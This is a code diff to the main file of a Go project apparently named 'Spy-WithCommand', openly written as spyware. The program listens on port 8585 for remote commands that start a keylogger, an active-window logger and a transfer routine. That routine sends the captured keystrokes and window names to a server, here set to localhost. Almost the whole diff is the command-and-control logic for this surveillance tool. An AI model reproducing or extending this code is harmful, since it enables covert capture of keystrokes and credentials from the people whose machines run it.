@@ -3,17 +3,19 @@ package main
 import (
 	"fmt"
 	"github.com/mhthrh/Spy-WithCommand/Application"
-	"github.com/mhthrh/Spy-WithCommand/Command"
 	"github.com/mhthrh/Spy-WithCommand/KeyBoard"
+	"github.com/mhthrh/Spy-WithCommand/Transfer"
 	"github.com/mhthrh/Spy-WithCommand/Utils/CryptoUtil"
 	"github.com/mhthrh/Spy-WithCommand/Utils/NetUtil"
+	"regexp"
+	"strings"
 	"time"
 )
 
 var (
-	key, app, cmd                        = make(chan string), make(chan string), make(chan string)
-	CommandQueue, WindowQueue, CharQueue = make(chan Command.Command, 100), make(chan Application.Application, 500), make(chan KeyBoard.KeyBoard, 10000)
-	crypto                               CryptoUtil.Crypto
+	key, app, cmd         = make(chan string, 1), make(chan string, 1), make(chan string, 1)
+	start, start1, start2 = make(chan bool, 1), make(chan bool, 1), make(chan bool, 1)
+	crypto                CryptoUtil.Crypto
 )
 
 func init() {
@@ -23,45 +25,58 @@ func main() {
 
 	go NetUtil.Listener("0.0.0.0", 8585, cmd)
 
-	go KeyBoard.KeyLogger(key)
-	go Application.AppLogger(app)
-
 	for {
 		select {
 		case res := <-key:
+			fmt.Println("0987654321")
 			crypto.Text = res
-			CharQueue <- KeyBoard.KeyBoard{
+			KeyBoard.CK <- KeyBoard.KeyBoard{
 				Char:     crypto.Result,
 				DateTime: time.Now(),
 			}
-			fmt.Println("added1")
-
 		case res := <-app:
+			fmt.Println("1234567890")
 			crypto.Text = res
-			WindowQueue <- Application.Application{
+			Application.CA <- Application.Application{
 				App:      crypto.Result,
 				DateTime: time.Now(),
 			}
-			fmt.Println("added2")
-
 		case res := <-cmd:
-			crypto.Text = res
-			CommandQueue <- Command.Command{
-				Cmd:      crypto.Result,
-				DateTime: time.Now(),
+			reg, err := regexp.Compile("[^a-zA-Z0-9-]+")
+			if err != nil {
+				return
 			}
-			fmt.Println("added3")
-		case res := <-cmd:
-			crypto.Text = res
-			CommandQueue <- Command.Command{
-				Cmd:      crypto.Result,
-				DateTime: time.Now(),
+			fmt.Println(res)
+			cmdS := strings.Split(reg.ReplaceAllString(res, ""), "-")
+			if cmdS[0] == "window" {
+				if cmdS[1] == "start" {
+					start <- true
+					go Application.AppLogger(app, &start)
+				} else {
+					start <- false
+				}
 			}
-			fmt.Println("added3")
-		case res1 := <-CommandQueue:
-
-			fmt.Println("added4")
-			fmt.Println(res1)
+			if cmdS[0] == "keyboard" {
+				if cmdS[1] == "start" {
+					start1 <- true
+					go KeyBoard.KeyLogger(key, &start1)
+				} else {
+					start1 <- false
+				}
+			}
+			if cmdS[0] == "transfer" {
+				if cmdS[1] == "start" {
+					start2 <- true
+					go Transfer.Send2Server(&Transfer.Transfer{
+						Ip:   "localhost",
+						Port: 8585,
+						CA:   &Application.CA,
+						CK:   &KeyBoard.CK,
+					}, &start2)
+				} else {
+					start2 <- false
+				}
+			}
 		}
 	}
 }
